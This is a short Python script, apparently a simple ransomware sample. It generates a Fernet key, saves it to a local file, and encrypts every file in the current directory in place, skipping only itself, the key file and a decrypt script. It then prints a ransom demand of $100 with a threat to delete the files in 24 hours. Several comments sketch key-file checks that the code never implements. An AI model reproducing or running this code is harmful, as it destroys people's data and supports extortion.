from cryptography.fernet import Fernet
import os

# Create a variable keyFile that contains path "encryptedKey.key"

# Check if keyFile path do not exits

    # Perform Following if key file do not exits
key = Fernet.generate_key()
    # Open keyFile instead of encryptedKey.key
with open("encryptedKey.key", "wb") as encryptedKey:
    encryptedKey.write(key)
# Else         

    # Open keyFile path in rb mode as encryptedKey

        # Create a new key by reading encryptedKey



files = []

for path in os.listdir():
    if (path == "main.py" or path == "encryptedKey.key" or path == "decrypt.py"):
        continue
    if os.path.isfile(path):
        files.append(path)

for file in files:
    with open(file, "rb") as file1:
        rawData = file1.read()
    encryptedRawData = Fernet(key).encrypt(rawData)

    with open(file, "wb") as file2:
        file2.write(encryptedRawData)

print("👹👹👹👹 All of your files has been encrypted send me $100 or I'll delete them in 24 hours!! 👹👹👹👹")
